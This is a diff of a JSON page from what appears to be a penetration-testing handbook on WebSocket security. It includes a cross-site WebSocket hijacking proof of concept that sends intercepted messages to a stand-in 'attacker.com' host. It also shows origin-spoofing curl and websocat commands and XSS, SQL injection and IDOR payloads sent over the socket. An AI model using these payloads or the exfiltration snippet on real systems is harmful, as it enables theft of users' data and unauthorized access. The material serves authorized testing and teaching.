@@ -12,202 +12,126 @@
     ],
     "sections": [
         {
-            "heading": "Protocol Basics",
-            "subheadings": [
-                {
-                    "heading": "Handshake Request",
-                    "type": "code_block",
-                    "content": [
-                        "GET /chat HTTP/1.1",
-                        "Host: normal-website.com",
-                        "Sec-WebSocket-Version: 13",
-                        "Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==",
-                        "Connection: keep-alive, Upgrade",
-                        "Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2",
-                        "Upgrade: websocket",
-                        "Origin: https://normal-website.com"
-                    ]
-                },
-                {
-                    "heading": "Handshake Response",
-                    "type": "code_block",
-                    "content": [
-                        "HTTP/1.1 101 Switching Protocols",
-                        "Connection: Upgrade",
-                        "Upgrade: websocket",
-                        "Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk="
-                    ]
-                }
+            "type": "hint",
+            "variant": "info",
+            "content": "WebSockets provide bi-directional, full-duplex communication over a single TCP connection. They are commonly used for real-time features like chat, notifications, and live updates, but often lack the traditional security controls found in standard HTTP APIs."
+        },
+        {
+            "heading": "Protocol Handshake",
+            "type": "code_block",
+            "content": [
+                "# Handshake Request",
+                "GET /chat HTTP/1.1",
+                "Host: normal-website.com",
+                "Sec-WebSocket-Version: 13",
+                "Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==",
+                "Connection: keep-alive, Upgrade",
+                "Upgrade: websocket",
+                "Origin: https://normal-website.com",
+                "",
+                "# Handshake Response",
+                "HTTP/1.1 101 Switching Protocols",
+                "Connection: Upgrade",
+                "Upgrade: websocket",
+                "Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk="
             ]
         },
         {
-            "heading": "Security Testing",
-            "subheadings": [
-                {
-                    "heading": "Cross-Site WebSocket Hijacking (CSWSH)",
-                    "type": "paragraph",
-                    "content": "If the server doesn't validate the Origin header, attackers can hijack WebSocket connections.\n``html\n\nvar ws = new WebSocket('wss://vulnerable-site.com/chat');\nws.onopen = function() {\nws.send('{\"action\": \"get_messages\"}');\n};\nws.onmessage = function(event) {\n// Exfiltrate data to attacker server\nfetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));\n};\n\n`\nTest for CSWSH:\n`bash\n# Check if Origin is validated\ncurl -i -N -H \"Connection: Upgrade\" \\\n-H \"Upgrade: websocket\" \\\n-H \"Host: target.com\" \\\n-H \"Origin: https://attacker.com\" \\\n-H \"Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==\" \\\n-H \"Sec-WebSocket-Version: 13\" \\\nhttps://target.com/socket\n# If 101 Switching Protocols → Vulnerable\n``"
-                },
-                {
-                    "heading": "Message Manipulation",
-                    "type": "code_block",
-                    "content": [
-                        "// Intercept and modify WebSocket messages in browser console",
-                        "const originalSend = WebSocket.prototype.send;",
-                        "WebSocket.prototype.send = function(data) {",
-                        "    console.log('Sending:', data);",
-                        "    // Modify data here",
-                        "    return originalSend.call(this, data);",
-                        "};"
-                    ]
-                },
-                {
-                    "heading": "Common Vulnerabilities",
-                    "type": "table",
-                    "headers": [
-                        "Vulnerability",
-                        "Test"
-                    ],
-                    "rows": [
-                        {
-                            "Vulnerability": "Missing Origin validation",
-                            "Test": "Send request with different Origin"
-                        },
-                        {
-                            "Vulnerability": "No authentication",
-                            "Test": "Connect without session cookie"
-                        },
-                        {
-                            "Vulnerability": "Injection in messages",
-                            "Test": "Send , SQL, etc. in messages"
-                        },
-                        {
-                            "Vulnerability": "IDOR via WebSocket",
-                            "Test": "Change user IDs in messages"
-                        },
-                        {
-                            "Vulnerability": "Rate limiting bypass",
-                            "Test": "WebSocket often lacks rate limits"
-                        },
-                        {
-                            "Vulnerability": "Insecure ws://",
-                            "Test": "Check if wss:// is enforced"
-                        }
-                    ]
-                }
+            "heading": "Security Testing & CSWSH",
+            "type": "code_block",
+            "content": [
+                "# Cross-Site WebSocket Hijacking (CSWSH)",
+                "# Occurs when the server fails to validate the 'Origin' header.",
+                "",
+                "# 1. Test for Vulnerability (Curl)",
+                "curl -i -N -H \"Connection: Upgrade\" \\",
+                "  -H \"Upgrade: websocket\" \\",
+                "  -H \"Host: target.com\" \\",
+                "  -H \"Origin: https://attacker.com\" \\",
+                "  -H \"Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==\" \\",
+                "  -H \"Sec-WebSocket-Version: 13\" \\",
+                "  https://target.com/socket",
+                "# Success = 101 Switching Protocols",
+                "",
+                "# 2. Attacker JS PoC",
+                "<script>",
+                "  var ws = new WebSocket('wss://vulnerable-site.com/chat');",
+                "  ws.onopen = () => ws.send('{\"action\": \"get_messages\"}');",
+                "  ws.onmessage = (e) => fetch('https://attacker.com/log?d=' + encodeURIComponent(e.data));",
+                "</script>",
+                "",
+                "# 3. Message Manipulation (Console)",
+                "const originalSend = WebSocket.prototype.send;",
+                "WebSocket.prototype.send = function(data) {",
+                "    console.log('Intercepted:', data);",
+                "    return originalSend.call(this, data);",
+                "};"
+            ]
+        },
+        {
+            "heading": "Vulnerability Checklist",
+            "type": "code_block",
+            "content": [
+                "- Origin Validation: Check if server accepts cross-origin handshake.",
+                "- Authentication: Try connecting without session cookies.",
+                "- Injection: Fuzz messages with XSS/SQLi/Command Injection payloads.",
+                "- IDOR: Check for predictable user/message IDs in JSON payloads.",
+                "- Rate Limiting: Test for lack of per-connection message limits.",
+                "- Insecure ws://: Verify if plain WebSocket is accepted over HTTP."
             ]
         },
         {
             "heading": "Testing Tools",
-            "subheadings": [
-                {
-                    "heading": "STEWS - Security Testing for WebSockets",
-                    "type": "code_block",
-                    "content": [
-                        "# https://github.com/PalindromeLabs/STEWS",
-                        "python3 stews.py -u wss://target.com/socket",
-                        "",
-                        "# Discovery mode",
-                        "python3 stews.py -u https://target.com --discovery",
-                        "",
-                        "# Fuzzing",
-                        "python3 stews.py -u wss://target.com/socket --fuzz"
-                    ]
-                },
-                {
-                    "heading": "Burp Suite",
-                    "type": "code_block",
-                    "content": [
-                        "1. Proxy → WebSockets history (shows all WS traffic)",
-                        "2. Right-click message → Send to Repeater",
-                        "3. Modify and resend messages",
-                        "4. Use Intruder for message fuzzing"
-                    ]
-                },
-                {
-                    "heading": "wscat (CLI WebSocket Client)",
-                    "type": "code_block",
-                    "content": [
-                        "# Install",
-                        "npm install -g wscat",
-                        "",
-                        "# Connect",
-                        "wscat -c wss://target.com/socket",
-                        "",
-                        "# With headers",
-                        "wscat -c wss://target.com/socket -H \"Cookie: session=abc123\"",
-                        "",
-                        "# Send message",
-                        "> {\"action\": \"get_user\", \"id\": 1}"
-                    ]
-                },
-                {
-                    "heading": "websocat",
-                    "type": "code_block",
-                    "content": [
-                        "# https://github.com/AhmedMohamedDev/websocat",
-                        "websocat wss://target.com/socket",
-                        "",
-                        "# With Origin header",
-                        "websocat -H \"Origin: https://attacker.com\" wss://target.com/socket"
-                    ]
-                }
-            ]
-        },
-        {
-            "heading": "Exploitation Scenarios",
-            "subheadings": [
-                {
-                    "heading": "XSS via WebSocket",
-                    "type": "code_block",
-                    "content": [
-                        "// If messages are rendered without sanitization",
-                        "ws.send('{\"message\": \"<img src=x onerror=alert(1)>\"}');"
-                    ]
-                },
-                {
-                    "heading": "SQL Injection via WebSocket",
-                    "type": "code_block",
-                    "content": [
-                        "ws.send('{\"user_id\": \"1 OR 1=1--\"}');",
-                        "ws.send('{\"search\": \"test\\' UNION SELECT password FROM users--\"}');"
-                    ]
-                },
-                {
-                    "heading": "Authorization Bypass",
-                    "type": "code_block",
-                    "content": [
-                        "// Try accessing other users' data",
-                        "ws.send('{\"action\": \"get_messages\", \"user_id\": \"admin\"}');",
-                        "ws.send('{\"action\": \"delete\", \"message_id\": \"1\", \"user_id\": \"victim\"}');"
-                    ]
-                }
-            ]
-        },
-        {
-            "heading": "Browser Console Testing",
             "type": "code_block",
             "content": [
-                "// Create connection",
-                "var ws = new WebSocket('wss://target.com/socket');",
+                "# STEWS - Security Testing for WebSockets",
+                "python3 stews.py -u wss://target.com/socket --discovery",
+                "python3 stews.py -u wss://target.com/socket --fuzz",
                 "",
-                "// Monitor events",
-                "ws.onopen = () => console.log('Connected');",
-                "ws.onmessage = (e) => console.log('Received:', e.data);",
-                "ws.onerror = (e) => console.log('Error:', e);",
-                "ws.onclose = () => console.log('Closed');",
+                "# wscat (CLI Client)",
+                "wscat -c wss://target.com/socket -H \"Cookie: session=abc123\"",
                 "",
-                "// Send test messages",
-                "ws.send(JSON.stringify({action: 'test'}));"
+                "# websocat",
+                "websocat -H \"Origin: https://attacker.com\" wss://target.com/socket",
+                "",
+                "# Burp Suite",
+                "1. Proxy -> WebSockets history",
+                "2. Send to Repeater for manual modification",
+                "3. Use Intruder for payload fuzzing"
+            ]
+        },
+        {
+            "heading": "Exploitation Vectors",
+            "type": "code_block",
+            "content": [
+                "# XSS via WebSocket",
+                "ws.send('{\"message\": \"<img src=x onerror=alert(1)>\"}');",
+                "",
+                "# SQL Injection via WebSocket",
+                "ws.send('{\"user_id\": \"1 OR 1=1--\"}');",
+                "ws.send('{\"search\": \"test\\' UNION SELECT password FROM users--\"}');",
+                "",
+                "# Authorization Bypass / IDOR",
+                "ws.send('{\"action\": \"get_messages\", \"user_id\": \"admin\"}');",
+                "ws.send('{\"action\": \"delete\", \"message_id\": \"1\", \"user_id\": \"victim\"}');"
             ]
         },
         {
             "heading": "Related Topics",
-            "type": "list",
-            "content": [
-                "CSRF - CSWSH is similar to CSRF",
-                "XSS - Can chain with WebSocket attacks",
-                "IDOR - Common in WebSocket APIs"
+            "type": "links",
+            "links": [
+                {
+                    "title": "CSRF - CSWSH is similar to CSRF",
+                    "url": "/enumeration/web/csrf"
+                },
+                {
+                    "title": "XSS - Can chain with WebSocket attacks",
+                    "url": "/enumeration/web/xss"
+                },
+                {
+                    "title": "IDOR - Common in WebSocket APIs",
+                    "url": "/enumeration/web/idor"
+                }
             ]
         }
     ],
@@ -215,34 +139,18 @@
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2026-02-03T14:05:45.496Z",
+        "last_updated": "2026-04-22T18:00:35Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/web-sockets.md",
         "previous_page": {
-            "title": "HTTP Request Smuggling",
+            "title": "Request Smuggling",
             "url": "/enumeration/web/request-smuggling"
         },
         "next_page": {
-            "title": "CRLF",
-            "url": "/enumeration/web/crlf"
+            "title": "Broken Links",
+            "url": "/enumeration/web/broken-links"
         }
     }
 }
